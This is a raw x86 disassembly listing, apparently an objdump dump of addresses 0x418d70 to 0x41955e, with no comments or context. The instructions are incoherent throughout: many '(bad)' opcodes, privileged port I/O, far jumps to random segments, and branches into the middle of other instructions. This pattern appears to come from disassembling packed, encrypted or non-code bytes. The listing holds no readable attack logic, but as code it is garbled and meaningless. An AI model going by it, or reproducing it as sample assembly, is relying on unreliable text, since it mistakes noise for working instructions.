  418d70:	or     ecx,DWORD PTR [esi+edx*4]
  418d73:	stos   BYTE PTR es:[edi],al
  418d74:	inc    ecx
  418d75:	inc    eax
  418d76:	repz fst QWORD PTR [ebp-0x22]
  418d7a:	cmp    eax,DWORD PTR [edx+0x31]
  418d7d:	pop    ebx
  418d7e:	test   eax,0x4d11d978
  418d83:	mov    esp,0x8e5c078d
  418d88:	xchg   BYTE PTR [ecx],ch
  418d8a:	mov    bl,0x54
  418d8c:	mov    eax,ds:0x6353f2fa
  418d91:	je     0x418e12
  418d93:	adc    eax,0x54668c94
  418d98:	ins    BYTE PTR es:[edi],dx
  418d99:	sub    DWORD PTR [esi-0x48852660],edx
  418d9f:	jne    0x418df3
  418da1:	pop    ds
  418da2:	loop   0x418de4
  418da4:	and    cl,BYTE PTR [edx]
  418da6:	push   ebx
  418da7:	cmp    eax,0x63273fdb
  418dac:	pop    ss
  418dad:	leave  
  418dae:	xor    BYTE PTR [ecx-0x56673193],bh
  418db4:	mov    edx,0x57cf9c39
  418db9:	xchg   edi,eax
  418dba:	mov    al,ds:0x4fd7ac7f
  418dbf:	jnp    0x418d4d
  418dc1:	xor    BYTE PTR [edi+0x4d091696],dh
  418dc7:	or     edx,0xffffffa3
  418dca:	push   ebp
  418dcb:	icebp  
  418dcc:	sub    ebx,DWORD PTR [edx+0x15]
  418dcf:	aad    0x65
  418dd1:	cmp    eax,0x4f21c1e5
  418dd6:	cmp    DWORD PTR [eax],edi
  418dd8:	cmp    al,0x96
  418dda:	mov    al,BYTE PTR [eax]
  418ddc:	xor    DWORD PTR [edx-0x10],edx
  418ddf:	mov    BYTE PTR [edx],bl
  418de1:	jecxz  0x418d9f
  418de3:	fstp   QWORD PTR [esi+0x2966e921]
  418de9:	sbb    eax,0xb4371cb8
  418dee:	(bad)  
  418def:	pushf  
  418df0:	pop    ds
  418df1:	dec    ecx
  418df2:	push   ecx
  418df3:	(bad)  
  418df4:	fisub  DWORD PTR [edi-0x21]
  418df7:	iret   
  418df8:	cmp    ah,BYTE PTR [esi+0x46]
  418dfb:	aam    0x91
  418dfd:	xlat   BYTE PTR ds:[ebx]
  418dfe:	arpl   si,ax
  418e00:	mov    ebp,0x662ebdc3
  418e05:	jns    0x418df9
  418e07:	sub    BYTE PTR [ebp-0x1e0e2350],cl
  418e0d:	jmp    0xfbeb4d11
  418e12:	and    edx,DWORD PTR [edi]
  418e14:	in     eax,dx
  418e15:	addr16 test al,0xaa
  418e18:	sbb    BYTE PTR [edi-0x2e5ebc7f],0xcc
  418e1f:	repnz xchg esp,eax
  418e21:	and    eax,0x11867b69
  418e26:	push   ebx
  418e27:	out    dx,al
  418e28:	sub    eax,0x70244a91
  418e2d:	and    bl,BYTE PTR ds:0xd33c0cd1
  418e33:	dec    eax
  418e34:	push   ebp
  418e35:	dec    ecx
  418e36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e37:	iret   
  418e38:	mov    bl,0x3f
  418e3a:	xor    BYTE PTR [edi+0x4e],0x62
  418e3e:	jle    0x418ebf
  418e40:	inc    ebx
  418e41:	out    dx,eax
  418e42:	dec    DWORD PTR [ebx+edi*1+0x68]
  418e46:	dec    eax
  418e47:	add    BYTE PTR [eax+ecx*4-0x360010d5],al
  418e4e:	fcomp  DWORD PTR [ebp+edi*2+0x73df3b92]
  418e55:	push   esp
  418e56:	mov    ebx,0x60cbb1bc
  418e5b:	push   es
  418e5c:	inc    ebx
  418e5d:	cmc    
  418e5e:	adc    cl,BYTE PTR [esp+ebp*1+0x24488423]
  418e65:	mov    esp,0xc3c9fc27
  418e6a:	cmp    eax,DWORD PTR [esi]
  418e6c:	push   ss
  418e6d:	lods   eax,DWORD PTR ds:[esi]
  418e6e:	addr16 ss add al,0xf0
  418e72:	lock mov ecx,DWORD PTR [ecx+esi*2+0x6a]
  418e77:	add    al,0xd2
  418e79:	ret    0x169e
  418e7c:	and    eax,0xec6f3883
  418e81:	jb     0x418e99
  418e83:	xchg   edi,eax
  418e84:	mov    cl,0x75
  418e86:	mov    DWORD PTR [ebx+0x4517174f],0x11ad3cc2
  418e90:	push   esi
  418e91:	in     al,0xea
  418e93:	sub    eax,0xbae40c4d
  418e98:	cwde   
  418e99:	xchg   ecx,eax
  418e9a:	jmp    0x418edc
  418e9c:	jle    0x418e7b
  418e9e:	jp     0x418e98
  418ea0:	push   ds
  418ea1:	ins    DWORD PTR es:[edi],dx
  418ea2:	add    DWORD PTR [esi-0x7331757],ebp
  418ea8:	js     0x418f1c
  418eaa:	adc    bh,0x43
  418ead:	int    0x2
  418eaf:	(bad)  
  418eb0:	jmp    0x97769783
  418eb5:	mov    bh,BYTE PTR [eax+ebp*1]
  418eb8:	rol    ebx,0xfd
  418ebb:	jle    0x418e5f
  418ebd:	jne    0x418ec8
  418ebf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ec0:	xor    eax,0x8e896581
  418ec5:	pop    edi
  418ec6:	scas   eax,DWORD PTR es:[edi]
  418ec7:	int3   
  418ec8:	sahf   
  418ec9:	ffree  st(1)
  418ecb:	xchg   edx,eax
  418ecc:	fstp   TBYTE PTR [edx+0x22]
  418ecf:	retf   0x30f5
  418ed2:	sbb    ch,ch
  418ed4:	cwde   
  418ed5:	jbe    0x418ec9
  418ed7:	or     eax,0xfbd8d522
  418edc:	popa   
  418edd:	xchg   ebx,eax
  418ede:	xchg   edx,eax
  418edf:	and    BYTE PTR [esi],dl
  418ee1:	pop    esp
  418ee2:	or     ecx,DWORD PTR [eax]
  418ee4:	in     al,0xe1
  418ee6:	sbb    BYTE PTR [ecx+0x3c6a2c15],dl
  418eec:	fst    DWORD PTR [edx-0x16]
  418eef:	sbb    cl,BYTE PTR [eax-0x5b]
  418ef2:	mov    eax,ds:0xadbbb5dc
  418ef7:	push   ebp
  418ef8:	jmp    0x6be81aca
  418efd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418efe:	jp     0x418ea1
  418f00:	or     bl,cl
  418f02:	dec    esi
  418f03:	mov    eax,0xa732c09
  418f08:	and    eax,DWORD PTR [eax]
  418f0a:	xor    DWORD PTR [ebx-0x3a],esi
  418f0d:	test   BYTE PTR [ecx],0xa9
  418f10:	movhps QWORD PTR [ebp+0x68b2b73],xmm4
  418f17:	js     0x418f6e
  418f19:	imul   edi,DWORD PTR [ecx-0x3e],0x5d81c656
  418f20:	push   eax
  418f21:	jmp    0xcf3:0x5153b4f5
  418f28:	rol    DWORD PTR [esi-0x1a6f8bb6],1
  418f2e:	inc    esi
  418f2f:	lahf   
  418f30:	mov    al,0x33
  418f32:	mov    ebp,0xdcf7c0d8
  418f37:	jg     0x418f48
  418f39:	mov    esp,0x395f2929
  418f3e:	mov    ch,0x61
  418f40:	add    al,0xf2
  418f42:	push   ds
  418f43:	out    dx,eax
  418f44:	push   esi
  418f45:	stos   DWORD PTR es:[edi],eax
  418f46:	jl     0x418f88
  418f48:	push   ecx
  418f49:	ret    
  418f4a:	(bad)  
  418f4b:	popf   
  418f4c:	pop    es
  418f4d:	in     eax,0x95
  418f4f:	int3   
  418f50:	or     al,0x86
  418f52:	cdq    
  418f53:	dec    eax
  418f54:	ret    0x592a
  418f57:	mov    ah,0x3c
  418f59:	in     al,dx
  418f5a:	xor    DWORD PTR [esi-0x7796e31d],edx
  418f60:	stos   BYTE PTR es:[edi],al
  418f61:	lods   al,BYTE PTR ds:[esi]
  418f62:	push   cs
  418f63:	xor    eax,0xd453b936
  418f68:	cmp    al,BYTE PTR [edi+0x4d]
  418f6b:	stos   DWORD PTR es:[edi],eax
  418f6c:	inc    esp
  418f6d:	add    eax,0x7f73f21f
  418f72:	xchg   esp,eax
  418f73:	or     eax,DWORD PTR [ecx+0xf]
  418f76:	mov    eax,0xe755b2f1
  418f7b:	test   BYTE PTR [ecx+0x27],al
  418f7e:	inc    edi
  418f7f:	adc    edi,DWORD PTR [ecx+eiz*8]
  418f82:	and    ah,BYTE PTR ds:0x21545313
  418f88:	sub    BYTE PTR [esi+0x37],ah
  418f8b:	push   eax
  418f8c:	ins    DWORD PTR es:[edi],dx
  418f8d:	lock popa 
  418f8f:	leave  
  418f90:	adc    esp,0xe
  418f93:	xchg   esi,eax
  418f94:	xchg   edi,eax
  418f95:	mov    eax,0x37cd48a2
  418f9a:	fwait
  418f9b:	mov    cl,0xb2
  418f9d:	mul    BYTE PTR [edi]
  418f9f:	fs (bad) 
  418fa1:	pop    ss
  418fa2:	mov    bl,0x8f
  418fa4:	push   esp
  418fa5:	pop    ebp
  418fa6:	(bad)  
  418fa7:	(bad)  
  418fa9:	add    DWORD PTR [esi-0x42be29af],edx
  418faf:	sahf   
  418fb0:	addr16 loope 0x418f92
  418fb3:	pop    ds
  418fb4:	test   bl,dh
  418fb6:	iret   
  418fb7:	lods   eax,DWORD PTR ds:[esi]
  418fb8:	and    DWORD PTR [esi+0xae057b4],0x58
  418fbf:	jmp    0x418f80
  418fc1:	fdivr  st,st(4)
  418fc3:	add    edx,esp
  418fc5:	sub    BYTE PTR es:[ecx+eiz*4],dl
  418fc9:	mov    ds:0xb4043291,eax
  418fce:	inc    ebp
  418fcf:	pop    ss
  418fd0:	mov    bl,0x73
  418fd2:	xchg   edx,eax
  418fd3:	call   0x4a72:0x1c08edff
  418fda:	imul   BYTE PTR [eax+0x717df34c]
  418fe0:	imul   ebp,esp,0x18df0cad
  418fe6:	sbb    al,0xc2
  418fe8:	mov    bl,0x8d
  418fea:	fsub   st,st(6)
  418fec:	shl    DWORD PTR [eax],cl
  418fee:	sub    cl,BYTE PTR [eax]
  418ff0:	push   ebp
  418ff1:	push   0xe0a61157
  418ff6:	mov    ah,0xb6
  418ff8:	pop    eax
  418ff9:	imul   DWORD PTR [edx-0x6c]
  418ffc:	and    eax,0x1f0a2fe3
  419001:	mov    ds:0x54a40ef0,al
  419006:	xchg   ebx,eax
  419007:	pop    ebx
  419008:	mov    esp,0x71ef0292
  41900d:	cmp    BYTE PTR [esi-0x2f],dl
  419010:	mov    cl,0x58
  419012:	call   0x1779:0xea153c8e
  419019:	pop    ebp
  41901a:	iret   
  41901b:	sbb    DWORD PTR [ecx+ebp*4],esi
  41901e:	ins    DWORD PTR es:[edi],dx
  41901f:	fidivr WORD PTR ds:0x7255e86a
  419025:	mov    esi,0x7f43cccb
  41902a:	jb     0x419012
  41902c:	or     al,BYTE PTR ds:[edi-0x3133e8b9]
  419033:	pop    eax
  419034:	(bad)  
  419035:	dec    ecx
  419036:	push   ebx
  419037:	push   eax
  419038:	hlt    
  419039:	mov    ebx,0x1a470e6f
  41903e:	(bad)  [edx-0x40]
  419041:	mov    edx,0xfdb97565
  419046:	xchg   ebx,eax
  419047:	test   BYTE PTR [eax+eax*1+0x36],0x91
  41904c:	ds cs mov dl,0x30
  419050:	in     eax,0xeb
  419052:	adc    DWORD PTR [ebx],0xd20a958b
  419058:	xchg   BYTE PTR [edi+ebp*2],cl
  41905b:	(bad)
  41905e:	mov    ebp,edi
  419060:	jne    0x419068
  419062:	adc    DWORD PTR [edi],eax
  419064:	shl    BYTE PTR [ecx-0x31],1
  419067:	loopne 0x41902c
  419069:	push   esp
  41906a:	jg     0x419032
  41906c:	lock push es
  41906e:	add    ebx,edi
  419070:	pop    ecx
  419071:	les    edx,FWORD PTR [eax+0x5a]
  419074:	and    BYTE PTR [ebx+0xf],ah
  419077:	mov    cl,0x37
  419079:	pop    eax
  41907a:	dec    ecx
  41907b:	jecxz  0x4190c7
  41907d:	inc    edi
  41907e:	daa    
  41907f:	mov    esp,0xd80e6953
  419084:	out    dx,al
  419085:	repnz inc edi
  419087:	lock ret 
  419089:	das    
  41908a:	jb     0x419056
  41908c:	leave  
  41908d:	aad    0xe1
  41908f:	add    al,0xc6
  419091:	jmp    0x629d8d28
  419096:	mov    ah,0x2a
  419098:	test   BYTE PTR [ebx+0x60795b85],dl
  41909e:	(bad)  
  4190a0:	sbb    ah,ch
  4190a2:	aam    0x2b
  4190a4:	js     0x41904d
  4190a6:	fidiv  DWORD PTR [edi]
  4190a8:	std    
  4190a9:	mov    eax,ds:0xbce2744a
  4190ae:	and    al,0xd1
  4190b0:	icebp  
  4190b1:	sbb    edi,ebp
  4190b3:	cmp    eax,0xee2567c7
  4190b8:	cdq    
  4190b9:	push   ebx
  4190ba:	push   edx
  4190bb:	(bad)  
  4190bc:	mov    ebp,0x25a1f7de
  4190c1:	addr16 aam 0x74
  4190c4:	mov    edx,0x9116afb4
  4190c9:	pop    ecx
  4190ca:	adc    esi,DWORD PTR [esi]
  4190cc:	sbb    DWORD PTR [eax],eax
  4190ce:	adc    al,0x60
  4190d0:	pop    ds
  4190d1:	lea    eax,[ecx-0x25048220]
  4190d7:	cmp    eax,0xbc975af7
  4190dc:	das    
  4190dd:	xor    DWORD PTR [ebp+0x7e],edx
  4190e0:	xchg   esp,eax
  4190e1:	int    0xb8
  4190e3:	outs   dx,BYTE PTR ds:[esi]
  4190e4:	mov    ch,0x90
  4190e6:	sbb    eax,0xa0ce3c46
  4190eb:	mov    WORD PTR [edi+0x516af242],es
  4190f1:	or     BYTE PTR [eax+0x33],bh
  4190f4:	aam    0xc8
  4190f6:	push   ds
  4190f7:	ins    DWORD PTR es:[edi],dx
  4190f8:	push   eax
  4190f9:	sti    
  4190fa:	and    ebx,DWORD PTR [eax-0x8c4c879]
  419100:	xor    BYTE PTR [ebx],ch
  419102:	jb     0x4190b6
  419104:	add    DWORD PTR [esi-0x15],eax
  419107:	loop   0x419170
  419109:	retf   0x2791
  41910c:	sbb    eax,DWORD PTR [ebx+0x3b23a86d]
  419112:	or     BYTE PTR [ebx],0xdf
  419115:	dec    edx
  419116:	int3   
  419117:	jb     0x4190a7
  419119:	lock adc al,0x1b
  41911c:	not    edx
  41911e:	mov    bl,0x8c
  419120:	adc    BYTE PTR [edx-0x54f317],ch
  419126:	shr    dh,cl
  419128:	dec    edx
  419129:	loopne 0x4191a3
  41912b:	add    BYTE PTR [esi-0x4cfb6e54],ch
  419131:	mov    ch,0xc3
  419133:	les    edx,FWORD PTR [eax-0x3f]
  419136:	jmp    0x41910d
  419138:	ret    0xc99c
  41913b:	sub    eax,0x344f283e
  419140:	ins    BYTE PTR es:[edi],dx
  419141:	mov    eax,0xd79cb126
  419146:	data16 std 
  419148:	sbb    WORD PTR [edx-0x9],cx
  41914c:	jecxz  0x41916a
  41914e:	sub    ch,BYTE PTR [ebx]
  419150:	js     0x41916c
  419152:	jmp    0x4190e9
  419154:	fldenv [ecx-0x2312cf86]
  41915a:	div    ebp
  41915c:	pop    ds
  41915d:	(bad)  
  41915e:	and    cl,BYTE PTR [edx+0x13e7c534]
  419164:	lods   al,BYTE PTR ds:[esi]
  419165:	pop    ecx
  419166:	xchg   esp,eax
  419167:	xor    al,0x57
  419169:	mov    ebx,0x43a2223a
  41916e:	fimul  DWORD PTR [edx]
  419170:	fwait
  419171:	inc    ebp
  419172:	xor    eax,0x25135b2
  419177:	jno    0x4191b0
  419179:	or     esp,ebx
  41917b:	daa    
  41917c:	add    edi,DWORD PTR [esi-0x257fecee]
  419182:	stos   BYTE PTR es:[edi],al
  419183:	cli    
  419184:	fsubr  QWORD PTR [edi+0x35da61fc]
  41918a:	xchg   edi,eax
  41918b:	test   DWORD PTR [ebx],esp
  41918d:	stc    
  41918e:	cmovle esi,DWORD PTR [ebx+0x16]
  419192:	push   esi
  419193:	data16 mov bl,bl
  419196:	(bad)  
  419197:	out    dx,eax
  419198:	shl    BYTE PTR [eax],1
  41919a:	std    
  41919b:	cld    
  41919c:	xlat   BYTE PTR ds:[ebx]
  41919d:	pop    es
  41919e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41919f:	sub    esp,DWORD PTR [edi-0x634b2ac]
  4191a5:	es (bad) 
  4191a7:	loopne 0x4191ba
  4191a9:	out    0xb7,eax
  4191ab:	retf   0x29f3
  4191ae:	in     eax,0x57
  4191b0:	cs xchg edx,ebp
  4191b3:	out    dx,eax
  4191b4:	dec    ebp
  4191b5:	mov    al,0x48
  4191b7:	test   DWORD PTR [ebx+0x3be974d5],esp
  4191bd:	or     edi,DWORD PTR [esi+0x20bb9604]
  4191c3:	call   FWORD PTR [edi]
  4191c5:	adc    edx,DWORD PTR [edi-0x75]
  4191c8:	xor    al,0xaf
  4191ca:	xchg   BYTE PTR [edx+edx*1+0x7b],ch
  4191ce:	push   ss
  4191cf:	inc    edx
  4191d0:	sub    BYTE PTR [esi-0x2edd3bca],ch
  4191d6:	ret    
  4191d7:	fwait
  4191d8:	xchg   esp,eax
  4191d9:	adc    BYTE PTR [edx],dh
  4191db:	inc    ecx
  4191dc:	mov    gs,edx
  4191de:	imul   esp,DWORD PTR [ebx+0x4e],0x4b
  4191e2:	jb     0x419227
  4191e4:	inc    cx
  4191e6:	inc    ebp
  4191e7:	xor    al,0x4e
  4191e9:	aaa    
  4191ea:	(bad)  
  4191eb:	mov    eax,ds:0x19ed7859
  4191f0:	or     al,0x55
  4191f2:	jge    0x4191d6
  4191f4:	adc    edi,DWORD PTR [esi-0x63bdfb66]
  4191fa:	xor    eax,0x3f54a1a3
  4191ff:	popa   
  419200:	loopne 0x4191ac
  419202:	popa   
  419203:	fcmovnu st,st(1)
  419205:	out    0x20,al
  419207:	xor    dl,BYTE PTR [eax-0x8aece8d]
  41920d:	int    0x84
  41920f:	mov    eax,0x7a39d424
  419214:	fistp  QWORD PTR ds:0x63a0fbb9
  41921a:	jmp    0xd558:0xee7179b1
  419221:	fsubr  DWORD PTR [ebx+0x4f851d48]
  419227:	mov    dl,0xc3
  419229:	dec    esp
  41922a:	jl     0x4191c1
  41922c:	xor    dl,BYTE PTR [edx+0x28]
  41922f:	push   0x1007b21
  419234:	outs   dx,DWORD PTR ds:[esi]
  419235:	psubd  mm6,QWORD PTR [ebx]
  419238:	fnstsw WORD PTR [ecx+ebp*8-0x75]
  41923c:	pusha  
  41923d:	mov    ecx,0x2e439a77
  419242:	jle    0x41927e
  419244:	clc    
  419245:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419246:	inc    edi
  419247:	int3   
  419248:	adc    esi,DWORD PTR [edx+0x7351c760]
  41924e:	cmp    eax,0x6889ab19
  419253:	xlat   BYTE PTR ds:[ebx]
  419254:	add    bh,BYTE PTR [edi]
  419256:	test   al,0xa9
  419258:	jle    0x41927c
  41925a:	xchg   edx,eax
  41925b:	mov    esi,0x822da2db
  419260:	add    al,0x7b
  419262:	jno    0x41923b
  419264:	test   ecx,edi
  419266:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419267:	jb     0x4191fe
  419269:	xchg   ecx,eax
  41926a:	pop    ebx
  41926b:	or     BYTE PTR ds:0x847579a6,0x13
  419272:	hlt    
  419273:	in     eax,dx
  419274:	je     0x419231
  419276:	pop    ds
  419277:	adc    eax,0xcea88cf4
  41927c:	mov    esp,DWORD PTR [edx+ebp*1+0x2bc5b2db]
  419283:	dec    esi
  419284:	into   
  419285:	push   cs
  419286:	sbb    ebp,DWORD PTR [ecx-0x1c]
  419289:	imul   esi,DWORD PTR [eax+0x3cf41239],0x18
  419290:	mov    al,0x1d
  419292:	mov    BYTE PTR [esi],dh
  419294:	add    eax,0xe2b790f4
  419299:	adc    eax,0x72430a5f
  41929e:	test   al,0xb9
  4192a0:	stos   DWORD PTR es:[edi],eax
  4192a1:	jo     0x4192f5
  4192a3:	(bad)
  4192a8:	inc    esp
  4192a9:	push   eax
  4192aa:	lds    esp,FWORD PTR [edx-0x18bf5a42]
  4192b0:	xor    bl,BYTE PTR ds:0x1a0fd2b3
  4192b6:	push   esi
  4192b7:	repnz cwde 
  4192b9:	nop
  4192ba:	cmp    DWORD PTR ds:0x318676bf,ecx
  4192c0:	mov    cl,0xec
  4192c2:	inc    esi
  4192c3:	and    ah,cl
  4192c5:	mov    edx,0xc7027ea6
  4192ca:	xchg   edx,eax
  4192cb:	rcl    BYTE PTR [ebp+0x693caff2],1
  4192d1:	xor    eax,0x659ac342
  4192d6:	sahf   
  4192d7:	mov    ecx,0xe8e492f
  4192dc:	stc    
  4192dd:	mov    eax,esp
  4192df:	add    eax,DWORD PTR [esi+eiz*1]
  4192e2:	cmc    
  4192e3:	cdq    
  4192e4:	mov    dl,0x75
  4192e6:	lahf   
  4192e7:	jne    0x419336
  4192e9:	lahf   
  4192ea:	je     0x41927a
  4192ec:	cmp    eax,0x455f9720
  4192f1:	test   eax,0xa192b2ab
  4192f6:	and    esi,ebp
  4192f8:	sti    
  4192f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4192fa:	sbb    WORD PTR [ebx],di
  4192fd:	cmp    al,0xf9
  4192ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419300:	mov    ds:0xc0cba9d,eax
  419305:	imul   esp,DWORD PTR [esi],0xffffffa4
  419308:	lea    ebp,[ecx-0x28]
  41930b:	cdq    
  41930c:	add    BYTE PTR [edx-0x47],al
  41930f:	xchg   edi,eax
  419310:	jecxz  0x41935c
  419312:	ja     0x41930e
  419314:	lea    ecx,[ebx]
  419316:	ror    DWORD PTR [edi-0x65b55323],1
  41931c:	cmp    esp,DWORD PTR [eax+eiz*2]
  41931f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419320:	aam    0x2
  419322:	jg     0x419323
  419324:	aam    0x7c
  419326:	mov    dl,0xad
  419328:	jmp    0x4192c7
  41932a:	adc    cl,BYTE PTR [eiz*1+0x3727a6fb]
  419331:	imul   esp,DWORD PTR [edx-0x6f19dcf0],0xdfe6eeb4
  41933b:	xchg   ebx,eax
  41933c:	jnp    0x4193a7
  41933e:	jle    0x4192ec
  419340:	fs jg  0x419345
  419343:	mov    ss,WORD PTR [ebp-0x1894d9af]
  419349:	je     0x41930d
  41934b:	cmc    
  41934c:	jle    0x4193bd
  41934e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41934f:	push   edx
  419350:	dec    ebp
  419351:	push   edx
  419352:	mov    edi,0x9d0adee
  419357:	sbb    dl,BYTE PTR [ebx+ebp*4-0xda34e5b]
  41935e:	adc    ah,BYTE PTR [esi+0x58]
  419361:	dec    eax
  419362:	jg     0x4193ab
  419364:	(bad)  
  419365:	sbb    BYTE PTR [edi+0x52],ah
  419368:	or     ebp,eax
  41936a:	xor    DWORD PTR ds:0xa1df394,ebx
  419370:	dec    ebp
  419371:	add    bl,ch
  419373:	aas    
  419374:	sbb    DWORD PTR [ecx-0x39],eax
  419377:	jle    0x419387
  419379:	stos   DWORD PTR es:[edi],eax
  41937a:	or     cl,dh
  41937c:	(bad)  
  41937d:	std    
  41937e:	sub    ah,BYTE PTR [eax+0x62]
  419381:	loopne 0x4193ae
  419383:	xchg   BYTE PTR [esi],ch
  419385:	popf   
  419386:	jecxz  0x419328
  419388:	imul   edx,DWORD PTR [ebx-0x5163605],0xe50f60f1
  419392:	aam    0xd1
  419394:	jmp    0x74becd60
  419399:	mov    ah,0x69
  41939b:	pushw  ss
  41939d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41939e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41939f:	adc    edx,DWORD PTR [ecx-0x4e]
  4193a2:	pushf  
  4193a3:	out    dx,eax
  4193a4:	mov    eax,0x86549b5d
  4193a9:	mov    BYTE PTR [eax-0x18],0x34
  4193ad:	inc    ebx
  4193ae:	stc    
  4193af:	jmp    0x419335
  4193b1:	sahf   
  4193b2:	mov    al,0x6f
  4193b4:	xchg   esi,eax
  4193b5:	jecxz  0x419435
  4193b7:	xor    eax,DWORD PTR [ebp-0x30b056fa]
  4193bd:	imul   edx,DWORD PTR [edx],0xffffffbf
  4193c0:	or     BYTE PTR [eax+edx*1],ch
  4193c3:	sub    BYTE PTR [esp+eax*4+0x7f2132c5],0x66
  4193cb:	jp     0x419438
  4193cd:	sbb    esi,esp
  4193cf:	mov    eax,ds:0xb4acf5f9
  4193d4:	test   ecx,0xe0dc9b51
  4193da:	or     al,0x1d
  4193dc:	and    edi,eax
  4193de:	and    eax,0x74daa4ec
  4193e3:	push   ss
  4193e4:	les    edx,FWORD PTR [eax-0x6b6c7720]
  4193ea:	vcmppd ymm0,ymm2,ymm2,0x6c
  4193ef:	push   esi
  4193f0:	xor    eax,0x3774125b
  4193f5:	mov    al,0x2b
  4193f7:	and    cl,0x4e
  4193fa:	push   es
  4193fb:	ss dec edx
  4193fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4193fe:	push   ds
  4193ff:	sub    BYTE PTR [edi],0xca
  419402:	int    0x6e
  419404:	jg     0x419426
  419406:	sar    DWORD PTR [edi],cl
  419408:	jmp    0x4193a0
  41940a:	sahf   
  41940b:	in     al,dx
  41940c:	aad    0xd9
  41940e:	lds    ecx,FWORD PTR ds:0xa01330bd
  419414:	adc    BYTE PTR [ecx-0x6354ab6f],0x52
  41941b:	and    bh,BYTE PTR [ebx]
  41941d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41941e:	push   esp
  41941f:	into   
  419420:	inc    edx
  419421:	push   ds
  419422:	in     eax,0xf6
  419424:	add    dl,BYTE PTR [esi+0x15]
  419427:	mov    eax,0xaecfacd6
  41942c:	add    bl,BYTE PTR [ecx-0x14]
  41942f:	out    dx,eax
  419430:	cmp    al,0x68
  419432:	stos   DWORD PTR es:[edi],eax
  419433:	stos   DWORD PTR es:[edi],eax
  419434:	sbb    ch,BYTE PTR [edx-0x246c27d5]
  41943a:	sub    ebp,ebx
  41943c:	cli    
  41943d:	xor    dh,BYTE PTR [ebp+0x72d527fb]
  419443:	out    0xd0,al
  419445:	fnstsw WORD PTR [ebx+0xd]
  419448:	pop    ecx
  419449:	je     0x4194a6
  41944b:	add    dh,BYTE PTR [edi]
  41944d:	ss mov esp,0xa58e05ae
  419453:	mov    ecx,0x9414bb3d
  419458:	pop    ecx
  419459:	dec    ecx
  41945a:	mov    ebp,0x3ba86d3
  41945f:	adc    BYTE PTR [edi+ecx*1],bh
  419462:	jmp    0x419481
  419464:	jns    0x419484
  419466:	repz cs ss push ecx
  41946a:	(bad)  
  41946c:	and    BYTE PTR [ecx],dh
  41946e:	aam    0xff
  419470:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419471:	mov    al,ds:0x18a92496
  419476:	and    BYTE PTR [ebp-0x5b],ch
  419479:	idiv   DWORD PTR [ecx-0x29ebdd6a]
  41947f:	repnz fdiv QWORD PTR [edx+0x5921e419]
  419486:	mov    ah,0x6
  419488:	pop    ds
  419489:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41948a:	(bad)  
  41948b:	outs   dx,BYTE PTR ds:[esi]
  41948c:	inc    DWORD PTR [ebp-0x12]
  41948f:	in     eax,0xc7
  419491:	pop    ss
  419492:	icebp  
  419493:	out    dx,al
  419494:	jecxz  0x419500
  419496:	(bad)  
  419497:	shr    BYTE PTR [esi],cl
  419499:	lds    bx,DWORD PTR [ebx-0x26ad0848]
  4194a0:	push   ebx
  4194a1:	dec    esp
  4194a2:	hlt    
  4194a3:	pusha  
  4194a4:	mov    eax,ds:0xe1bee046
  4194a9:	xor    edx,esi
  4194ab:	jl     0x4194ce
  4194ad:	in     al,dx
  4194ae:	fisubr DWORD PTR [edx+0x3b]
  4194b1:	adc    BYTE PTR [esi-0x71e2bb9b],0x87
  4194b8:	ret    
  4194b9:	jp     0x4194ff
  4194bb:	(bad)  
  4194bd:	dec    esp
  4194be:	(bad)  
  4194bf:	and    BYTE PTR [eax],al
  4194c1:	jmp    ecx
  4194c3:	xor    dh,al
  4194c5:	dec    ecx
  4194c6:	jb     0x419469
  4194c8:	les    eax,FWORD PTR [ebp-0x5]
  4194cb:	or     eax,0xc6064631
  4194d0:	lods   eax,DWORD PTR ds:[esi]
  4194d1:	iret   
  4194d2:	sub    BYTE PTR [edx],dl
  4194d4:	in     eax,dx
  4194d5:	aas    
  4194d6:	(bad)  
  4194d7:	popa   
  4194d8:	aam    0xd1
  4194da:	aam    0x34
  4194dc:	push   ebp
  4194dd:	mov    ds:0x9efe23dc,eax
  4194e2:	inc    esp
  4194e3:	mov    edi,0x65a1e4d3
  4194e9:	mov    ebp,0x750df696
  4194ee:	add    eax,0xddddef80
  4194f3:	add    bl,BYTE PTR [ebp-0x5234e384]
  4194f9:	mov    WORD PTR [ecx+ebx*2+0x3113c8e7],?
  419500:	push   esp
  419501:	aam    0xd1
  419503:	mov    bl,BYTE PTR [eax]
  419505:	nop
  419506:	rep lods al,BYTE PTR ds:[esi]
  419508:	mov    ecx,0xe3761711
  41950d:	inc    ebx
  41950e:	ja     0x419519
  419510:	xchg   ebp,eax
  419511:	rcr    BYTE PTR [ebp-0x736efd60],cl
  419517:	and    dl,BYTE PTR [eax-0x7f457041]
  41951d:	not    BYTE PTR [esi+eiz*1-0x28]
  419521:	and    DWORD PTR [ebx],edi
  419523:	pop    ebp
  419524:	daa    
  419525:	sbb    al,BYTE PTR ss:[ebp-0xa707d8c]
  41952c:	scas   al,BYTE PTR es:[edi]
  41952d:	popf   
  41952e:	sbb    BYTE PTR [eax+0x51],ch
  419531:	gs pop ds
  419533:	ret    
  419534:	push   edi
  419535:	sbb    al,BYTE PTR [edx+0x4efe7845]
  41953b:	push   eax
  41953c:	add    DWORD PTR [esp+ebp*8+0x49a81d13],0x17
  419544:	call   0xd7de:0xc47ab889
  41954b:	xor    DWORD PTR [ecx],eax
  41954d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41954e:	mov    esp,0x440a1785
  419553:	das    
  419554:	mov    cl,0x39
  419556:	fucompp 
  419558:	or     ebx,DWORD PTR [eax-0x69a4b894]
  41955e:	dec    ebp
